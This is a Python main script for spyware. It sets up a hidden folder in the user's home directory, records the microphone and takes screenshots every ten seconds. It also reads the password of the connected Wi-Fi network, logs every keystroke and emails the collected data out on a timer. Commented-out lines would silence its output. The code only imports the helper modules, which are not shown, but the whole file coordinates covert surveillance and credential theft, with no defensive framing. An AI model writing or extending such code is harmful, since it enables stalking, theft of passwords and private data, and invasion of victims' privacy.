import os
import threading
from pynput import keyboard
from email_sender import email_thread
from logger_setup import operation_logger
from screenshot import periodic_screenshots
from audio_rec import record_audio
from wifi_info import get_current_wifi_ssid, get_wifi_password
from keylogger import on_press  

log_dir = os.path.join(os.path.expanduser("~"), ".hiddenfolder")
os.makedirs(log_dir, exist_ok=True)

if __name__ == "__main__":
    # sys.stdout = open(os.devnull, 'w')
    # sys.stderr = open(os.devnull, 'w')

    screenshot_thread = threading.Thread(target=periodic_screenshots, args=(10,), daemon=True)
    screenshot_thread.start()

    audio_filename = os.path.join(log_dir, "audio_rec.wav")
    recording_duration = 150 
    audio_thread = threading.Thread(target=record_audio, args=(audio_filename, recording_duration), daemon=True)
    audio_thread.start()

    current_ssid = get_current_wifi_ssid()
    if current_ssid:
        get_wifi_password(current_ssid)
    else:
        operation_logger.info("No connected Wi-Fi network found.")

    email_thread_interval = 150
    email_thread = threading.Thread(target=email_thread, args=(email_thread_interval,), daemon=True)
    email_thread.start()

    listener = keyboard.Listener(on_press=on_press)
    listener.start()
    listener.join()